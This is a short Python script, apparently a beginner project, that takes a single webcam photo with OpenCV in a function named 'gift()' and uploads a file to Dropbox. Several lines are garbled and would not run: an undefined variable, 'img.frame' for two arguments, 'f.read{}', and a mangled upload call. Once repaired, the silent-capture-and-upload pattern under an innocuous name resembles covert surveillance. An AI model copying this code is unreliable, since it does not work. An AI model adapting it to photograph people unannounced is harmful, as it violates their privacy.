import cv2
from cv2 import VideoCapture
import dropbox
import time
import random

def gift():
    thing=random.randint(0,100)
    #initializing cv2
    videoCaptureObject=cv2.VideoCapture(0)
    result=True
    while(result):
        ret,frame=videoCaptureObject.read()
        img="img"+str(number)+".png"
        cv2.imwrite(img.frame)
        result=False

    videoCaptureObject.release()
    print()
    cv2.destroyAllWindows()

gift()


def something(img):
    access_token=""
    file =img
    file_from = file
    file_to=""+(img)
    dbx = dropbox.Dropbox(access_token)

    with open(file_from, 'rb') as f:
        dbx.files_upload(f.read{}, file_tomode+dropbox.files.WriteMode.overwrite)
        print("file uploaded")